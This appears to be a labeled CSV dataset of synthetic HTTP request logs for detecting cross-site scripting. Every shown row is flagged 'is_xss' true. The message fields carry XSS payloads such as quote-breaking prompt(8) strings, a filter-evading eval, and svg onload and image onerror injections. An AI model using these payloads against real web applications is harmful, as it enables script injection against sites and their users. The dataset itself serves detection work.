mimetype,timestamp,request_uri,user_ip,content_length,request_type,user_agent,message,is_xss
"image/jpeg, */*",6895255592900423730,http://127.0.0.1:5000/capital/i7qmd3zv,10.10.209.57,73339,POST,Mozilla/4.0 (compatible; MSIE 4.01; Windows 98),"""-prompt(8)-""",true
"image/png, */*",323526467433938253,http://127.0.0.1:5000/mortgage/6qnje1as,172.23.102.40,89624,POST,Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.4) Gecko/2008120512 Gentoo Firefox/3.0.4,'-prompt(8)-',true
"text/html, */*",5458357318606684091,http://127.0.0.1:5000/portfolio/vlazdl65,10.241.253.174,33713,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931,""";a=prompt,a()//",true
"application/json, text/plain, */*",3734616313142453316,http://127.0.0.1:5000/dividend/z5lvzero,10.9.114.120,81385,POST,Mozilla/4.0 (MSIE 6.0; Windows NT 5.0),"';a=prompt,a()//",true
"application/json, text/html, image/jpeg, */*",1297616244110360288,http://127.0.0.1:5000/loan/zlul1hmw,10.212.131.0,31941,POST,Mozilla/4.0 (compatible; MSIE 5.0; Windows XP) Opera 6.01  [it],"'-eval(""window['pro'%2B'mpt'](8)"")-'",true
"text/plain, */*",5815080298653409265,http://127.0.0.1:5000/mortgage/x24desfa,10.126.24.96,54267,GET,Mozilla/5.0 (X11; Linux i686; rv:2.0b12pre) Gecko/20100101 Firefox/4.0b12pre,"""-eval(""window['pro'%2B'mpt'](8)"")-""",true
"text/plain, */*",173028078090043109,http://127.0.0.1:5000/interest/zde6b0ei,10.174.241.69,30123,POST,"Mozilla/5.0 (Windows; U; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.1.2 Safari/525.21","""onclick=prompt(8)>""@x.y",true
"text/plain, image/png, image/jpeg, */*",2755908576793151950,http://127.0.0.1:5000/equity/52nkxka4,10.97.79.81,76929,GET,Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC),"""onclick=prompt(8)><svg/onload=prompt(8)>""@x.y",true
"application/json, text/plain, text/html, image/png, */*",5509695218992615221,http://127.0.0.1:5000/stock/q0ecnvpr,172.29.154.212,88429,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577",<image/src/onerror=prompt(8)>,true
"text/html, image/jpeg, application/json, text/plain, */*",1644441784642094569,http://127.0.0.1:5000/debit/jpx9ndtc,10.213.247.25,71975,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",<img/src/onerror=prompt(8)>,true
"application/json, image/jpeg, text/plain, */*",6902459342544873333,http://127.0.0.1:5000/loan/771be0x9,10.29.185.85,15702,PUT,Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2),<image src/onerror=prompt(8)>,true
